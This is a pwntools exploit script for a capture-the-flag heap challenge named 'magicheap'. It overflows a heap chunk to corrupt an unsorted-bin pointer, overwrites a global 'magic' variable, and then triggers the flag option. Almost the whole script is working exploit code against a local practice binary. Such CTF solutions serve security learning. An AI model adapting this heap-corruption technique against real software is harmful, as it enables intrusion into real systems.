from __future__ import print_function
from pwn import *

target = process('./magicheap')
#gdb.attach(target)

def add(size, content):
	print(target.recvuntil("Your choice :"))
	target.sendline("1")
	print(target.recvuntil("Size of Heap : "))
	target.sendline(str(size))
	print(target.recvuntil("Content of heap:"))
	target.send(content)


def edit(index, size, content):
	print(target.recvuntil("Your choice :"))
	target.sendline("2")
	print(target.recvuntil("Index :"))
	target.sendline(str(index))
	print(target.recvuntil("Size of Heap : "))
	target.sendline(str(size))
	#print target.recvuntil("Content of heap:")
	target.sendline(content)

def delete(index):
	print(target.recvuntil("Your choice :"))
	target.sendline("3")
	print(target.recvuntil("Index :"))
	target.sendline(str(index))

# Declare the target variable
magic = 0x6020c0

# Allocate our three chunks
add(0xf0, "15935728")# 0
add(0xf0, "75395128")# 1
add(0x30, "05935728")# 2

# Free the middle chunk, add it to the unsorted bin
delete(1)

# Overwrite the bk pointer of the chunk in the unsorted bin
edit(0, 0x110, "0"*0xf8 + p64(0x101) + "1"*0x8 + p64(magic - 0x10))

# Reallocate chunk 1 to remove it from the unsorted bin, and trigger the write
add(0xf0, "0000")

# Send the option to get the flag
target.sendline("4869")


target.interactive()
